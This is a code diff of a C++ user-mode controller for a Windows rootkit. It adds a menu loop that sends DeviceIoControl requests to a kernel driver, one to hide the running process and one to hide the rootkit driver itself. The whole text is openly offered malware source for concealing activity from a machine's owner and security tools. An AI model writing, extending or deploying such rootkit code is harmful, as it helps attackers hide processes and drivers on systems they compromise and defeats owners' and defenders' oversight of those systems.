@@ -6,7 +6,7 @@ int main()
 {
 	HANDLE hDevice;
 	UINT32 pid;
-	int uselessData;
+	int option;
 	DATA_FROM_USER dataBuffer = { 0 };
 	DATA_TO_USER dataBufferFromKernel = { 0 };
 	hDevice = CreateFileA(
@@ -30,19 +30,30 @@ int main()
 	pid = GetCurrentProcessId();
 
 	dataBuffer.PID = pid;
-
-	// now let's try to send this to the user..
-	std::cout << "our PID is : " << pid << std::endl;
-	std::cout << "enter any number to hide the process.\n";
 	
-	std::cin >> uselessData;
+	for (;;) {
+		std::cout << "Choose an option:\n";
+		std::cout << "1) hide this user-mode process.\n";
+		std::cout << "2) hide the rootkit kernel driver\n";
+		std::cout << "3) Exit.\n";
+		std::cin >> option;
 
-	DeviceIoControl(hDevice, RK_CTL, &dataBuffer, DATA_FROM_USER_SIZE, &dataBufferFromKernel, DATA_TO_USER_SIZE, NULL, NULL);
-	
-	// now let's see if our process got or not..
-	std::cout << "is my process hidden ? " << dataBufferFromKernel.IsProcessHidden << std::endl;
-
-	std::cin >> uselessData;
+		switch (option)
+		{
+		case 1:
+			DeviceIoControl(hDevice, RK_CTL_PROCESS_HIDE, &dataBuffer, DATA_FROM_USER_SIZE, &dataBufferFromKernel, DATA_TO_USER_SIZE, NULL, NULL);
+			std::cout << "is the process hidden (1,0)? " << dataBufferFromKernel.IsProcessHidden << std::endl;
+			break;
+		case 2:
+			DeviceIoControl(hDevice, RK_CTL_DRIVER_HIDE, NULL, 0, NULL, 0, NULL, NULL);
+			std::cout << "[+] The drive now should be hidden\n";
+			break;
+		case 3:
+			return 0;
+		default:
+			break;
+		}
+	}
 
 	return 0;
 }
